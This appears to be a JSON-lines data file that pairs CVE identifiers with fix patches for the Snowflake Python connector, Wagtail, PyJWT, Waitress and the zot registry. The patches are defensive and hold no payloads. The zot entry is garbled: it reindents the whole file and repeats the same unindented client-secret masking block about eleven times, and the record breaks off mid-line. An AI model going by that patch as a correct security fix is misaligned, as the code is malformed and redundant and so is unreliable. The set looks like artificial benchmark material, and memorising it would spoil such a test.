{"cve":"CVE-2024-49750:0708", "fix_patch": "diff --git a/src/snowflake/connector/auth/_auth.py b/src/snowflake/connector/auth/_auth.py\nindex b8aa8f48..e2b342b8 100644\n--- a/src/snowflake/connector/auth/_auth.py\n+++ b/src/snowflake/connector/auth/_auth.py\n@@ -243,7 +243,7 @@ class Auth:\n \n         logger.debug(\n             \"body['data']: %s\",\n-            {k: v for (k, v) in body[\"data\"].items() if k != \"PASSWORD\"},\n+            {k: v for (k, v) in body[\"data\"].items() if k not in (\"PASSWORD\", \"PASSCODE\")},\n         )\n \n         try:\ndiff --git a/src/snowflake/connector/secret_detector.py b/src/snowflake/connector/secret_detector.py\nindex 6633cda6..1aa6924c 100644\n--- a/src/snowflake/connector/secret_detector.py\n+++ b/src/snowflake/connector/secret_detector.py\n@@ -29,11 +29,11 @@ class SecretDetector(logging.Formatter):\n         flags=re.IGNORECASE,\n     )\n     SAS_TOKEN_PATTERN = re.compile(\n-        r\"(sig|signature|AWSAccessKeyId|password|passcode)=(?P<secret>[a-z0-9%/+]{16,})\",\n+        r\"(?:sig|signature|AWSAccessKeyId|password|passcode)=(?P<secret>[a-zA-Z0-9%/+]{16,})\",\n         flags=re.IGNORECASE,\n     )\n     PRIVATE_KEY_PATTERN = re.compile(\n-        r\"-----BEGIN PRIVATE KEY-----\\\\n([a-z0-9/+=\\\\n]{32,})\\\\n-----END PRIVATE KEY-----\",\n+        r\"-----BEGIN( [A-Z0-9]+)? PRIVATE KEY-----\\\\n([a-z0-9/+=\\\\n]{32,})\\\\n-----END( [A-Z0-9]+)? PRIVATE KEY-----\",\n         flags=re.MULTILINE | re.IGNORECASE,\n     )\n     PRIVATE_KEY_DATA_PATTERN = re.compile(\n"}
{"cve":"CVE-2023-45809:0708", "fix_patch": "diff --git a/wagtail/users/views/bulk_actions/user_bulk_action.py b/wagtail/users/views/bulk_actions/user_bulk_action.py\nindex 76d05db58d..3616f40a39 100644\n--- a/wagtail/users/views/bulk_actions/user_bulk_action.py\n+++ b/wagtail/users/views/bulk_actions/user_bulk_action.py\n@@ -8,7 +8,7 @@ class UserBulkAction(BulkAction):\n     models = [get_user_model()]\n \n     def get_all_objects_in_listing_query(self, parent_id):\n-        listing_objects = self.model.objects.all().values_list(\"pk\", flat=True)\n+        listing_objects = self.get_queryset().values_list(\"pk\", flat=True)\n         if \"q\" in self.request.GET:\n             q = self.request.GET.get(\"q\")\n             model_fields = {f.name for f in self.model._meta.get_fields()}\n"}
{"cve":"CVE-2022-29217:0708", "fix_patch": "diff --git a/jwt/algorithms.py b/jwt/algorithms.py\nindex 739df80..a76b2c8 100644\n--- a/jwt/algorithms.py\n+++ b/jwt/algorithms.py\n@@ -75,7 +75,6 @@ def get_default_algorithms():\n     Returns the algorithms that are implemented by the library.\n     \"\"\"\n     default_algorithms = {\n-        \"none\": NoneAlgorithm(),\n         \"HS256\": HMACAlgorithm(HMACAlgorithm.SHA256),\n         \"HS384\": HMACAlgorithm(HMACAlgorithm.SHA384),\n         \"HS512\": HMACAlgorithm(HMACAlgorithm.SHA512),\n"}
{"cve":"CVE-2019-16789:0708", "fix_patch": "diff --git a/waitress/parser.py b/waitress/parser.py\nindex dd591f2..4f6fac1 100644\n--- a/waitress/parser.py\n+++ b/waitress/parser.py\n@@ -254,32 +254,40 @@ class HTTPRequestParser(object):\n             # never need to deal with chunked requests, downstream clients\n             # should not see the HTTP_TRANSFER_ENCODING header; we pop it\n             # here\n-            te = headers.pop(\"TRANSFER_ENCODING\", \"\")\n-\n-            encodings = [encoding.strip().lower() for encoding in te.split(\",\") if encoding]\n-\n-            for encoding in encodings:\n-                # Out of the transfer-codings listed in\n-                # https://tools.ietf.org/html/rfc7230#section-4 we only support\n-                # chunked at this time.\n-\n-                # Note: the identity transfer-coding was removed in RFC7230:\n-                # https://tools.ietf.org/html/rfc7230#appendix-A.2 and is thus\n-                # not supported\n-                if encoding not in {\"chunked\"}:\n+            te = headers.pop(\"TRANSFER_ENCODING\", None)\n+\n+            if te is not None:\n+                encodings = [encoding.lower() for encoding in te.split(\",\") if encoding]\n+\n+                for encoding in encodings:\n+                    # After splitting on ',', there should be no Linear White\n+                    # Space (LWS) around the value.\n+                    if encoding.strip() != encoding:\n+                        raise ParsingError(\n+                            \"Invalid whitespace in Transfer-Encoding header\"\n+                        )\n+\n+                    # Out of the transfer-codings listed in\n+                    # https://tools.ietf.org/html/rfc7230#section-4 we only support\n+                    # chunked at this time.\n+\n+                    # Note: the identity transfer-coding was removed in RFC7230:\n+                    # https://tools.ietf.org/html/rfc7230#appendix-A.2 and is thus\n+                    # not supported\n+                    if encoding not in {\"chunked\"}:\n+                        raise TransferEncodingNotImplemented(\n+                            \"Transfer-Encoding requested is not supported.\"\n+                        )\n+\n+                if encodings and encodings[-1] == \"chunked\":\n+                    self.chunked = True\n+                    buf = OverflowableBuffer(self.adj.inbuf_overflow)\n+                    self.body_rcv = ChunkedReceiver(buf)\n+                elif encodings:  # pragma: nocover\n                     raise TransferEncodingNotImplemented(\n                         \"Transfer-Encoding requested is not supported.\"\n                     )\n \n-            if encodings and encodings[-1] == \"chunked\":\n-                self.chunked = True\n-                buf = OverflowableBuffer(self.adj.inbuf_overflow)\n-                self.body_rcv = ChunkedReceiver(buf)\n-            elif encodings:  # pragma: nocover\n-                raise TransferEncodingNotImplemented(\n-                    \"Transfer-Encoding requested is not supported.\"\n-                )\n-\n             expect = headers.get(\"EXPECT\", \"\").lower()\n             self.expect_continue = expect == \"100-continue\"\n             if connection.lower() == \"close\":\n@@ -350,18 +358,35 @@ def get_header_lines(header):\n     Splits the header into lines, putting multi-line headers together.\n     \"\"\"\n     r = []\n-    lines = header.split(b\"\\r\\n\")\n+    lines = header.split(b'\\r\\n')\n+\n+    # We are going to be super strict here. We are not going to support ANY\n+    # support for obs-fold. This means that we can't have any whitespace at the\n+    # start of a header, as it is not allowed in RFC7230. obs-fold is\n+    # optional to support, and not supporting it is safer.\n+    #\n+    # From RFC7230 Section 3.2:\n+    #\n+    # field-name: field-value\n+    #\n+    # From RFC7230 Section 3.2.4:\n+    #\n+    # obs-fold = OWS CRLF RWS\n+    #\n+    # And should be read as a single space.\n+    #\n+\n     for line in lines:\n-        if b\"\\r\" in line or b\"\\n\" in line:\n+        if b'\\r' in line or b'\\n' in line:\n             raise ParsingError('Bare CR or LF found in header line \"%s\"' % tostr(line))\n \n+        # See the comment above, we are not going to support obs-fold, so we\n+        # are going to treat any whitespace at the start of the line as an\n+        # error.\n         if line.startswith((b\" \", b\"\\t\")):\n-            if not r:\n-                # https://corte.si/posts/code/pathod/pythonservers/index.html\n-                raise ParsingError('Malformed header line \"%s\"' % tostr(line))\n-            r[-1] += line\n-        else:\n-            r.append(line)\n+            raise ParsingError('Leading whitespace unsupported in header line \"%s\"' % tostr(line))\n+\n+        r.append(line)\n     return r\n \n \n"}
{"cve":"CVE-2025-48374:0708", "fix_patch": "diff --git a/pkg/api/config/config.go b/pkg/api/config/config.go\nindex 39f86639..81cd9f8e 100644\n--- a/pkg/api/config/config.go\n+++ b/pkg/api/config/config.go\n@@ -1,555 +1,682 @@\n package config\n \n import (\n-\t\"encoding/json\"\n-\t\"os\"\n-\t\"time\"\n+        \"encoding/json\"\n+        \"os\"\n+        \"time\"\n \n-\tdistspec \"github.com/opencontainers/distribution-spec/specs-go\"\n+        distspec \"github.com/opencontainers/distribution-spec/specs-go\"\n \n-\t\"zotregistry.dev/zot/pkg/compat\"\n-\textconf \"zotregistry.dev/zot/pkg/extensions/config\"\n-\tstorageConstants \"zotregistry.dev/zot/pkg/storage/constants\"\n+        \"zotregistry.dev/zot/pkg/compat\"\n+        extconf \"zotregistry.dev/zot/pkg/extensions/config\"\n+        storageConstants \"zotregistry.dev/zot/pkg/storage/constants\"\n )\n \n var (\n-\tCommit     string //nolint: gochecknoglobals\n-\tReleaseTag string //nolint: gochecknoglobals\n-\tBinaryType string //nolint: gochecknoglobals\n-\tGoVersion  string //nolint: gochecknoglobals\n+        Commit     string //nolint: gochecknoglobals\n+        ReleaseTag string //nolint: gochecknoglobals\n+        BinaryType string //nolint: gochecknoglobals\n+        GoVersion  string //nolint: gochecknoglobals\n \n-\topenIDSupportedProviders = [...]string{\"google\", \"gitlab\", \"oidc\"} //nolint: gochecknoglobals\n-\toauth2SupportedProviders = [...]string{\"github\"}                   //nolint: gochecknoglobals\n+        openIDSupportedProviders = [...]string{\"google\", \"gitlab\", \"oidc\"} //nolint: gochecknoglobals\n+        oauth2SupportedProviders = [...]string{\"github\"}                   //nolint: gochecknoglobals\n \n )\n \n type StorageConfig struct {\n-\tRootDirectory string\n-\tDedupe        bool\n-\tRemoteCache   bool\n-\tGC            bool\n-\tCommit        bool\n-\tGCDelay       time.Duration // applied for blobs\n-\tGCInterval    time.Duration\n-\tRetention     ImageRetention\n-\tStorageDriver map[string]interface{} `mapstructure:\",omitempty\"`\n-\tCacheDriver   map[string]interface{} `mapstructure:\",omitempty\"`\n+        RootDirectory string\n+        Dedupe        bool\n+        RemoteCache   bool\n+        GC            bool\n+        Commit        bool\n+        GCDelay       time.Duration // applied for blobs\n+        GCInterval    time.Duration\n+        Retention     ImageRetention\n+        StorageDriver map[string]interface{} `mapstructure:\",omitempty\"`\n+        CacheDriver   map[string]interface{} `mapstructure:\",omitempty\"`\n }\n \n type ImageRetention struct {\n-\tDryRun   bool\n-\tDelay    time.Duration // applied for referrers and untagged\n-\tPolicies []RetentionPolicy\n+        DryRun   bool\n+        Delay    time.Duration // applied for referrers and untagged\n+        Policies []RetentionPolicy\n }\n \n type RetentionPolicy struct {\n-\tRepositories    []string\n-\tDeleteReferrers bool\n-\tDeleteUntagged  *bool\n-\tKeepTags        []KeepTagsPolicy\n+        Repositories    []string\n+        DeleteReferrers bool\n+        DeleteUntagged  *bool\n+        KeepTags        []KeepTagsPolicy\n }\n \n type KeepTagsPolicy struct {\n-\tPatterns                []string\n-\tPulledWithin            *time.Duration\n-\tPushedWithin            *time.Duration\n-\tMostRecentlyPushedCount int\n-\tMostRecentlyPulledCount int\n+        Patterns                []string\n+        PulledWithin            *time.Duration\n+        PushedWithin            *time.Duration\n+        MostRecentlyPushedCount int\n+        MostRecentlyPulledCount int\n }\n \n type TLSConfig struct {\n-\tCert   string\n-\tKey    string\n-\tCACert string\n+        Cert   string\n+        Key    string\n+        CACert string\n }\n \n type AuthHTPasswd struct {\n-\tPath string\n+        Path string\n }\n \n type AuthConfig struct {\n-\tFailDelay         int\n-\tHTPasswd          AuthHTPasswd\n-\tLDAP              *LDAPConfig\n-\tBearer            *BearerConfig\n-\tOpenID            *OpenIDConfig\n-\tAPIKey            bool\n-\tSessionKeysFile   string\n-\tSessionHashKey    []byte `json:\"-\"`\n-\tSessionEncryptKey []byte `json:\"-\"`\n+        FailDelay         int\n+        HTPasswd          AuthHTPasswd\n+        LDAP              *LDAPConfig\n+        Bearer            *BearerConfig\n+        OpenID            *OpenIDConfig\n+        APIKey            bool\n+        SessionKeysFile   string\n+        SessionHashKey    []byte `json:\"-\"`\n+        SessionEncryptKey []byte `json:\"-\"`\n }\n \n type BearerConfig struct {\n-\tRealm   string\n-\tService string\n-\tCert    string\n+        Realm   string\n+        Service string\n+        Cert    string\n }\n \n type SessionKeys struct {\n-\tHashKey    string\n-\tEncryptKey string `mapstructure:\",omitempty\"`\n+        HashKey    string\n+        EncryptKey string `mapstructure:\",omitempty\"`\n }\n \n type OpenIDConfig struct {\n-\tProviders map[string]OpenIDProviderConfig\n+        Providers map[string]OpenIDProviderConfig\n }\n \n type OpenIDProviderConfig struct {\n-\tName         string\n-\tClientID     string\n-\tClientSecret string\n-\tKeyPath      string\n-\tIssuer       string\n-\tScopes       []string\n+        Name         string\n+        ClientID     string\n+        ClientSecret string\n+        KeyPath      string\n+        Issuer       string\n+        Scopes       []string\n }\n \n type MethodRatelimitConfig struct {\n-\tMethod string\n-\tRate   int\n+        Method string\n+        Rate   int\n }\n \n type RatelimitConfig struct {\n-\tRate    *int                    // requests per second\n-\tMethods []MethodRatelimitConfig `mapstructure:\",omitempty\"`\n+        Rate    *int                    // requests per second\n+        Methods []MethodRatelimitConfig `mapstructure:\",omitempty\"`\n }\n \n //nolint:maligned\n type HTTPConfig struct {\n-\tAddress       string\n-\tExternalURL   string `mapstructure:\",omitempty\"`\n-\tPort          string\n-\tAllowOrigin   string // comma separated\n-\tTLS           *TLSConfig\n-\tAuth          *AuthConfig\n-\tAccessControl *AccessControlConfig `mapstructure:\"accessControl,omitempty\"`\n-\tRealm         string\n-\tRatelimit     *RatelimitConfig            `mapstructure:\",omitempty\"`\n-\tCompat        []compat.MediaCompatibility `mapstructure:\",omitempty\"`\n+        Address       string\n+        ExternalURL   string `mapstructure:\",omitempty\"`\n+        Port          string\n+        AllowOrigin   string // comma separated\n+        TLS           *TLSConfig\n+        Auth          *AuthConfig\n+        AccessControl *AccessControlConfig `mapstructure:\"accessControl,omitempty\"`\n+        Realm         string\n+        Ratelimit     *RatelimitConfig            `mapstructure:\",omitempty\"`\n+        Compat        []compat.MediaCompatibility `mapstructure:\",omitempty\"`\n }\n \n type SchedulerConfig struct {\n-\tNumWorkers int\n+        NumWorkers int\n }\n \n // contains the scale-out configuration which is identical for all zot replicas.\n type ClusterConfig struct {\n-\t// contains the \"host:port\" of all the zot instances participating\n-\t// in the cluster.\n-\tMembers []string `json:\"members\" mapstructure:\"members\"`\n+        // contains the \"host:port\" of all the zot instances participating\n+        // in the cluster.\n+        Members []string `json:\"members\" mapstructure:\"members\"`\n \n-\t// contains the hash key that is required for siphash.\n-\t// must be a 128-bit (16-byte) key\n-\t// https://github.com/dchest/siphash?tab=readme-ov-file#func-newkey-byte-hashhash64\n-\tHashKey string `json:\"hashKey\" mapstructure:\"hashKey\"`\n+        // contains the hash key that is required for siphash.\n+        // must be a 128-bit (16-byte) key\n+        // https://github.com/dchest/siphash?tab=readme-ov-file#func-newkey-byte-hashhash64\n+        HashKey string `json:\"hashKey\" mapstructure:\"hashKey\"`\n \n-\t// contains client TLS config.\n-\tTLS *TLSConfig `json:\"tls\" mapstructure:\"tls\"`\n+        // contains client TLS config.\n+        TLS *TLSConfig `json:\"tls\" mapstructure:\"tls\"`\n \n-\t// private field for storing Proxy details such as internal socket list.\n-\tProxy *ClusterRequestProxyConfig `json:\"-\" mapstructure:\"-\"`\n+        // private field for storing Proxy details such as internal socket list.\n+        Proxy *ClusterRequestProxyConfig `json:\"-\" mapstructure:\"-\"`\n }\n \n type ClusterRequestProxyConfig struct {\n-\t// holds the cluster socket (IP:port) derived from the host's\n-\t// interface configuration and the listening port of the HTTP server.\n-\tLocalMemberClusterSocket string\n-\t// index of the local member cluster socket in the members array.\n-\tLocalMemberClusterSocketIndex uint64\n+        // holds the cluster socket (IP:port) derived from the host's\n+        // interface configuration and the listening port of the HTTP server.\n+        LocalMemberClusterSocket string\n+        // index of the local member cluster socket in the members array.\n+        LocalMemberClusterSocketIndex uint64\n }\n \n type LDAPCredentials struct {\n-\tBindDN       string\n-\tBindPassword string\n+        BindDN       string\n+        BindPassword string\n }\n \n type LDAPConfig struct {\n-\tCredentialsFile    string\n-\tPort               int\n-\tInsecure           bool\n-\tStartTLS           bool // if !Insecure, then StartTLS or LDAPs\n-\tSkipVerify         bool\n-\tSubtreeSearch      bool\n-\tAddress            string\n-\tbindDN             string `json:\"-\"`\n-\tbindPassword       string `json:\"-\"`\n-\tUserGroupAttribute string\n-\tBaseDN             string\n-\tUserAttribute      string\n-\tUserFilter         string\n-\tCACert             string\n+        CredentialsFile    string\n+        Port               int\n+        Insecure           bool\n+        StartTLS           bool // if !Insecure, then StartTLS or LDAPs\n+        SkipVerify         bool\n+        SubtreeSearch      bool\n+        Address            string\n+        bindDN             string `json:\"-\"`\n+        bindPassword       string `json:\"-\"`\n+        UserGroupAttribute string\n+        BaseDN             string\n+        UserAttribute      string\n+        UserFilter         string\n+        CACert             string\n }\n \n func (ldapConf *LDAPConfig) BindDN() string {\n-\treturn ldapConf.bindDN\n+        return ldapConf.bindDN\n }\n \n func (ldapConf *LDAPConfig) SetBindDN(bindDN string) *LDAPConfig {\n-\tldapConf.bindDN = bindDN\n+        ldapConf.bindDN = bindDN\n \n-\treturn ldapConf\n+        return ldapConf\n }\n \n func (ldapConf *LDAPConfig) BindPassword() string {\n-\treturn ldapConf.bindPassword\n+        return ldapConf.bindPassword\n }\n \n func (ldapConf *LDAPConfig) SetBindPassword(bindPassword string) *LDAPConfig {\n-\tldapConf.bindPassword = bindPassword\n+        ldapConf.bindPassword = bindPassword\n \n-\treturn ldapConf\n+        return ldapConf\n }\n \n type LogConfig struct {\n-\tLevel  string\n-\tOutput string\n-\tAudit  string\n+        Level  string\n+        Output string\n+        Audit  string\n }\n \n type GlobalStorageConfig struct {\n-\tStorageConfig `mapstructure:\",squash\"`\n-\tSubPaths      map[string]StorageConfig\n+        StorageConfig `mapstructure:\",squash\"`\n+        SubPaths      map[string]StorageConfig\n }\n \n type AccessControlConfig struct {\n-\tRepositories Repositories `json:\"repositories\" mapstructure:\"repositories\"`\n-\tAdminPolicy  Policy\n-\tGroups       Groups\n-\tMetrics      Metrics\n+        Repositories Repositories `json:\"repositories\" mapstructure:\"repositories\"`\n+        AdminPolicy  Policy\n+        Groups       Groups\n+        Metrics      Metrics\n }\n \n func (config *AccessControlConfig) AnonymousPolicyExists() bool {\n-\tif config == nil {\n-\t\treturn false\n-\t}\n+        if config == nil {\n+                return false\n+        }\n \n-\tfor _, repository := range config.Repositories {\n-\t\tif len(repository.AnonymousPolicy) > 0 {\n-\t\t\treturn true\n-\t\t}\n-\t}\n+        for _, repository := range config.Repositories {\n+                if len(repository.AnonymousPolicy) > 0 {\n+                        return true\n+                }\n+        }\n \n-\treturn false\n+        return false\n }\n \n type (\n-\tRepositories map[string]PolicyGroup\n-\tGroups       map[string]Group\n+        Repositories map[string]PolicyGroup\n+        Groups       map[string]Group\n )\n \n type Group struct {\n-\tUsers []string\n+        Users []string\n }\n \n type PolicyGroup struct {\n-\tPolicies        []Policy\n-\tDefaultPolicy   []string\n-\tAnonymousPolicy []string\n+        Policies        []Policy\n+        DefaultPolicy   []string\n+        AnonymousPolicy []string\n }\n \n type Policy struct {\n-\tUsers   []string\n-\tActions []string\n-\tGroups  []string\n+        Users   []string\n+        Actions []string\n+        Groups  []string\n }\n \n type Metrics struct {\n-\tUsers []string\n+        Users []string\n }\n \n type Config struct {\n-\tDistSpecVersion string `json:\"distSpecVersion\" mapstructure:\"distSpecVersion\"`\n-\tGoVersion       string\n-\tCommit          string\n-\tReleaseTag      string\n-\tBinaryType      string\n-\tStorage         GlobalStorageConfig\n-\tHTTP            HTTPConfig\n-\tLog             *LogConfig\n-\tExtensions      *extconf.ExtensionConfig\n-\tScheduler       *SchedulerConfig `json:\"scheduler\" mapstructure:\",omitempty\"`\n-\tCluster         *ClusterConfig   `json:\"cluster\"   mapstructure:\",omitempty\"`\n+        DistSpecVersion string `json:\"distSpecVersion\" mapstructure:\"distSpecVersion\"`\n+        GoVersion       string\n+        Commit          string\n+        ReleaseTag      string\n+        BinaryType      string\n+        Storage         GlobalStorageConfig\n+        HTTP            HTTPConfig\n+        Log             *LogConfig\n+        Extensions      *extconf.ExtensionConfig\n+        Scheduler       *SchedulerConfig `json:\"scheduler\" mapstructure:\",omitempty\"`\n+        Cluster         *ClusterConfig   `json:\"cluster\"   mapstructure:\",omitempty\"`\n }\n \n func New() *Config {\n-\treturn &Config{\n-\t\tDistSpecVersion: distspec.Version,\n-\t\tGoVersion:       GoVersion,\n-\t\tCommit:          Commit,\n-\t\tReleaseTag:      ReleaseTag,\n-\t\tBinaryType:      BinaryType,\n-\t\tStorage: GlobalStorageConfig{\n-\t\t\tStorageConfig: StorageConfig{\n-\t\t\t\tDedupe:     true,\n-\t\t\t\tGC:         true,\n-\t\t\t\tGCDelay:    storageConstants.DefaultGCDelay,\n-\t\t\t\tGCInterval: storageConstants.DefaultGCInterval,\n-\t\t\t\tRetention:  ImageRetention{},\n-\t\t\t},\n-\t\t},\n-\t\tHTTP: HTTPConfig{Address: \"127.0.0.1\", Port: \"8080\", Auth: &AuthConfig{FailDelay: 0}},\n-\t\tLog:  &LogConfig{Level: \"debug\"},\n-\t}\n+        return &Config{\n+                DistSpecVersion: distspec.Version,\n+                GoVersion:       GoVersion,\n+                Commit:          Commit,\n+                ReleaseTag:      ReleaseTag,\n+                BinaryType:      BinaryType,\n+                Storage: GlobalStorageConfig{\n+                        StorageConfig: StorageConfig{\n+                                Dedupe:     true,\n+                                GC:         true,\n+                                GCDelay:    storageConstants.DefaultGCDelay,\n+                                GCInterval: storageConstants.DefaultGCInterval,\n+                                Retention:  ImageRetention{},\n+                        },\n+                },\n+                HTTP: HTTPConfig{Address: \"127.0.0.1\", Port: \"8080\", Auth: &AuthConfig{FailDelay: 0}},\n+                Log:  &LogConfig{Level: \"debug\"},\n+        }\n }\n \n func (expConfig StorageConfig) ParamsEqual(actConfig StorageConfig) bool {\n-\treturn expConfig.GC == actConfig.GC && expConfig.Dedupe == actConfig.Dedupe &&\n-\t\texpConfig.GCDelay == actConfig.GCDelay && expConfig.GCInterval == actConfig.GCInterval\n+        return expConfig.GC == actConfig.GC && expConfig.Dedupe == actConfig.Dedupe &&\n+                expConfig.GCDelay == actConfig.GCDelay && expConfig.GCInterval == actConfig.GCInterval\n }\n \n // SameFile compare two files.\n // This method will first do the stat of two file and compare using os.SameFile method.\n func SameFile(str1, str2 string) (bool, error) {\n-\tsFile, err := os.Stat(str1)\n-\tif err != nil {\n-\t\treturn false, err\n-\t}\n+        sFile, err := os.Stat(str1)\n+        if err != nil {\n+                return false, err\n+        }\n \n-\ttFile, err := os.Stat(str2)\n-\tif err != nil {\n-\t\treturn false, err\n-\t}\n+        tFile, err := os.Stat(str2)\n+        if err != nil {\n+                return false, err\n+        }\n \n-\treturn os.SameFile(sFile, tFile), nil\n+        return os.SameFile(sFile, tFile), nil\n }\n \n func DeepCopy(src, dst interface{}) error {\n-\tbytes, err := json.Marshal(src)\n-\tif err != nil {\n-\t\treturn err\n-\t}\n+        bytes, err := json.Marshal(src)\n+        if err != nil {\n+                return err\n+        }\n \n-\terr = json.Unmarshal(bytes, dst)\n+        err = json.Unmarshal(bytes, dst)\n \n-\treturn err\n+        return err\n }\n \n // Sanitize makes a sanitized copy of the config removing any secrets.\n func (c *Config) Sanitize() *Config {\n-\tsanitizedConfig := &Config{}\n+        sanitizedConfig := &Config{}\n \n-\tif err := DeepCopy(c, sanitizedConfig); err != nil {\n-\t\tpanic(err)\n-\t}\n+        if err := DeepCopy(c, sanitizedConfig); err != nil {\n+                panic(err)\n+        }\n \n-\tif c.HTTP.Auth != nil && c.HTTP.Auth.LDAP != nil && c.HTTP.Auth.LDAP.bindPassword != \"\" {\n-\t\tsanitizedConfig.HTTP.Auth.LDAP = &LDAPConfig{}\n+        if c.HTTP.Auth != nil && c.HTTP.Auth.LDAP != nil && c.HTTP.Auth.LDAP.bindPassword != \"\" {\n+                sanitizedConfig.HTTP.Auth.LDAP = &LDAPConfig{}\n \n-\t\tif err := DeepCopy(c.HTTP.Auth.LDAP, sanitizedConfig.HTTP.Auth.LDAP); err != nil {\n-\t\t\tpanic(err)\n-\t\t}\n+                if err := DeepCopy(c.HTTP.Auth.LDAP, sanitizedConfig.HTTP.Auth.LDAP); err != nil {\n+                        panic(err)\n+                }\n \n-\t\tsanitizedConfig.HTTP.Auth.LDAP.bindPassword = \"******\"\n-\t}\n+                sanitizedConfig.HTTP.Auth.LDAP.bindPassword = \"******\"\n+        }\n \n-\tif c.IsEventRecorderEnabled() {\n-\t\tfor i, sink := range c.Extensions.Events.Sinks {\n-\t\t\tif sink.Credentials == nil {\n-\t\t\t\tcontinue\n-\t\t\t}\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n \n-\t\t\tif err := DeepCopy(&c.Extensions.Events.Sinks[i], &sanitizedConfig.Extensions.Events.Sinks[i]); err != nil {\n-\t\t\t\tpanic(err)\n-\t\t\t}\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n \n-\t\t\tsanitizedConfig.Extensions.Events.Sinks[i].Credentials.Password = \"******\"\n-\t\t}\n-\t}\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+if c.HTTP.Auth != nil && c.HTTP.Auth.OpenID != nil {\n+for providerName, providerConfig := range sanitizedConfig.HTTP.Auth.OpenID.Providers {\n+// a map value is not addressable\n+// we need to copy the struct, modify and assign it back\n+if providerConfig.ClientSecret != \"\" {\n+providerConfig.ClientSecret = \"******\"\n+sanitizedConfig.HTTP.Auth.OpenID.Providers[providerName] = providerConfig\n+}\n+}\n+}\n+\n+if c.IsEventRecorderEnabled() {\n+for i, sink := range c.Extensions.Events.Sinks {\n+if sink.Credentials == nil {\n+continue\n+}\n+\n+if err := DeepCopy(&c.Extensions.Events.Sinks[i], &sanitizedConfig.Extensions.Events.Sinks[i]); err != nil {\n+panic(err)\n+}\n+\n+sanitizedConfig.Extensions.Events.Sinks[i].Credentials.Password = \"******\"\n+}\n+}\n \n-\treturn sanitizedConfig\n+        return sanitizedConfig\n }\n \n func (c *Config) IsLdapAuthEnabled() bool {\n-\tif c.HTTP.Auth != nil && c.HTTP.Auth.LDAP != nil {\n-\t\treturn true\n-\t}\n+        if c.HTTP.Auth != nil && c.HTTP.Auth.LDAP != nil {\n+                return true\n+        }\n \n-\treturn false\n+        return false\n }\n \n func (c *Config) IsAuthzEnabled() bool {\n-\treturn c.HTTP.AccessControl != nil\n+        return c.HTTP.AccessControl != nil\n }\n \n func (c *Config) IsMTLSAuthEnabled() bool {\n-\tif c.HTTP.TLS != nil &&\n-\t\tc.HTTP.TLS.Key != \"\" 